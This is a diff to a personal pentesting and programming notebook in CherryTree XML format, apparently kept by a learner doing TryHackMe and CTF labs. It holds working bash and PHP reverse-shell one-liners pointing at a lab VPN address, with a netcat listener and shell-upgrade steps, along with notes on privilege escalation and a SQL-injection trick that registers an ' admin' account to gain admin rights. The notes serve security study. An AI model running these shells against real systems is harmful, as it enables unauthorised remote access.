@@ -1895,6 +1938,9 @@ mydoubler becomes a function. Use lambda functions when an anonymous function is
 				</node>
 			</node>
 		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="PHP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727130.1" ts_lastsave="1594727136.42" unique_id="611">
+			<rich_text>PHP doesn't let you have a try without a catch</rich_text>
+		</node>
 	</node>
 	<node custom_icon_id="37" foreground="#000000" is_bold="True" name="Pentesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586539696.48" ts_lastsave="1592512827.79" unique_id="285">
 		<rich_text>
@@ -1902,8 +1948,9 @@ mydoubler becomes a function. Use lambda functions when an anonymous function is
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Basic privesc techniques" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259282.15" ts_lastsave="1587637554.25" unique_id="378">
 			<rich_text>Good source: </rich_text>
 			<rich_text link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="1. Kernel exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259658.1" ts_lastsave="1587481620.41" unique_id="383">
-				<rich_text>uname -a</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="1. Kernel exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259658.1" ts_lastsave="1594728224.92" unique_id="383">
+				<rich_text>uname -a
+very &quot;basic&quot; thmyris. very.</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="2. Exploiting services which are running as root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259641.16" ts_lastsave="1587292086.94" unique_id="382">
 				<rich_text>mysql running as root?
@@ -2289,9 +2336,8 @@ don’t forget to disable the encode options</rich_text>
 					<rich_text>
 </rich_text>
 				</node>
-				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720847.01" ts_lastsave="1589758814.6" unique_id="325">
-					<rich_text>
-</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720847.01" ts_lastsave="1594892130.14" unique_id="325">
+					<rich_text></rich_text>
 				</node>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/shadow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720892.05" ts_lastsave="1589758815.84" unique_id="327">
 					<rich_text>root access only, obviously.</rich_text>
@@ -2615,19 +2661,19 @@ msf post(shell_to_meterpreter) &gt; exploit</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="reverse shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633727.99" ts_lastsave="1589696491.39" unique_id="294">
 			<rich_text>
 </rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633729.81" ts_lastsave="1589933911.95" unique_id="295">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633729.81" ts_lastsave="1594728161.22" unique_id="295">
 				<rich_text>Create:
 echo
 echo
 bash -i &amp;&gt; /dev/tcp/10.9.17.250/9001 0&gt;&amp;1
 
 Find ip: 
-ifconfig tun0 | grep inet #tun0 because we're assuming ur connecting through a VPN
+ifconfig tun0 | grep inet | xclip #tun0 because we're connecting through a VPN
 
 Listen:
 nc -lvnp 9001
 
-Python Upgraded Shell:              # for up, down history + tab autocomplete
+Python Upgraded Shell(for up, down history + tab autocomplete):
 
 # TARGET MACHINE:
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
@@ -2645,9 +2691,19 @@ export TERM=xterm
 
 </rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="php" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589696491.65" ts_lastsave="1589696726.13" unique_id="499">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="php" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589696491.65" ts_lastsave="1594728459.73" unique_id="499">
 				<rich_text>This file is big. Theres a shorter version on pentest monkeys cheatsheet, bigger is more robust &amp; also bigger is for the .php file. While the other one is for terminal? uhh???
 
+</rich_text>
+				<rich_text underline="single" weight="heavy">SHORT VERSION:</rich_text>
+				<rich_text>
+php -r '$sock=fsockopen(&quot;10.9.17.250&quot;,9001);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+				<rich_text underline="single" weight="heavy">LONG VERSION:</rich_text>
+				<rich_text>
 Host:
 nc -lvnp 9001
 
@@ -3465,7 +3521,7 @@ info registers
 </rich_text>
 			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="kart hacking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592513132.49" ts_lastsave="1592513132.49" unique_id="596">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="card hacking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592513132.49" ts_lastsave="1594727913.75" unique_id="596">
 			<rich_text>
 </rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="NFC Tools" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592513107.62" ts_lastsave="1592513134.68" unique_id="595">
@@ -3487,7 +3543,7 @@ lunaparklarda bu iki freq de degil baska bisey kullaniliyor.</rich_text>
 dont forget to put these notes back in the respective folder for clarity, maybe even delete from here idk
 
 REMINDER: These notes are a draft. They are meant to stay a draft. I first take notes, then after im done with a box I go over them to add new learnings to the document</rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="THM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540200.1" ts_lastsave="1589752646.3" unique_id="289">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="THM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540200.1" ts_lastsave="1594727781.68" unique_id="289">
 			<rich_text>
 </rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="adventofcyber" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587050136.95" ts_lastsave="1589428177.5" unique_id="352">
@@ -3955,6 +4011,19 @@ noot:x:1005:1006:,,,:/home/noot:/bin/bash
 </rich_text>
 				</node>
 			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="owasptop10" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727781.68" ts_lastsave="1594892335.34" unique_id="617">
+				<rich_text></rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Day 1" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727847.19" ts_lastsave="1595260732.25" unique_id="618">
+					<rich_text>task6.#2 icin /etc/passwd e baktim ama istedigi non sartlari nasil cozeriz?
+heralde sadece userlari soruyor.
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="day 2" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595260732.25" ts_lastsave="1595261330.93" unique_id="625">
+					<rich_text>mdisec sqli dersinde ogrendigim &quot; admin&quot; seklinde yeni uye olmayi gosteriyor.
+bu yeni uyenin yetkileri admin ile ayni olcak cunku mysql select sorgusu hem &quot;admin&quot;i hemde &quot; admin&quot;i dondurcek veya o girdi girilirken isim admin oldugu icin admin yetkileri verilcek dbde.
+</rich_text>
+				</node>
+			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="Basic Pentesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540195.48" ts_lastsave="1586726764.83" unique_id="288">
 				<rich_text>10.10.123.174
 ssh://jan@armando
@@ -4130,6 +4199,9 @@ searchsploit file upload and try to execute and ezpz
 			<node custom_icon_id="0" foreground="" is_bold="False" name="thecodcaper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589919155.9" ts_lastsave="1591389324.33" unique_id="561">
 				<rich_text>10.10.93.23
 this box rekt me :S</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="sqli" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594667990.04" ts_lastsave="1594667990.04" unique_id="607">
+				<rich_text></rich_text>
 			</node>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="th-picoCTF19" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579348103.78" ts_lastsave="1587637689.3" unique_id="154">
@@ -4321,12 +4393,12 @@ apt remove                          # remove a package.</rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="apt-get" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018802.17" ts_lastsave="1586019299.3" unique_id="167">
 				<rich_text>apt in dedesi, cok daha fazla argumani var, less end-user friendly</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="aptitude" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018795.14" ts_lastsave="1586269113.56" unique_id="166">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="aptitude" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018795.14" ts_lastsave="1594753656.87" unique_id="166">
 				<rich_text>better looking and functioning version of apt
 
 gives clarity around dependencies &amp; conflicts
 gives a GUI when used without arguments ( might need to have tasksel installed i ddidnt quite understand this part)
-</rich_text>
+RESOLVE DEPENDENCIES</rich_text>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269113.68" ts_lastsave="1586269231.24" unique_id="237">
 					<rich_text>&quot;aptitude&quot; prefix is applied to every sub command here</rich_text>
 					<node custom_icon_id="0" foreground="" is_bold="False" name="autoclean" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269790.47" ts_lastsave="1586269791.75" unique_id="255">
@@ -4553,10 +4625,10 @@ However, explicitly adding the snap name to </rich_text>
 			</node>
 		</node>
 	</node>
-	<node custom_icon_id="12" foreground="" is_bold="False" name="what this file is not" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578934079.35" ts_lastsave="1589428022.27" unique_id="142">
+	<node custom_icon_id="12" foreground="" is_bold="False" name="what this file is not" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578934079.35" ts_lastsave="1594655022.79" unique_id="142">
 		<rich_text>this is a personal documentation
 anything that is out of my scope will mostly not be covered here.
-if I had no interest before I'll have no interest in the future.</rich_text>
+if I had no interest before I'll very likely have no interest in the future.</rich_text>
 	</node>
 	<node custom_icon_id="15" foreground="" is_bold="False" name="read &amp; integrate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578933042.78" ts_lastsave="1590021246.87" unique_id="133">
 		<rich_text>
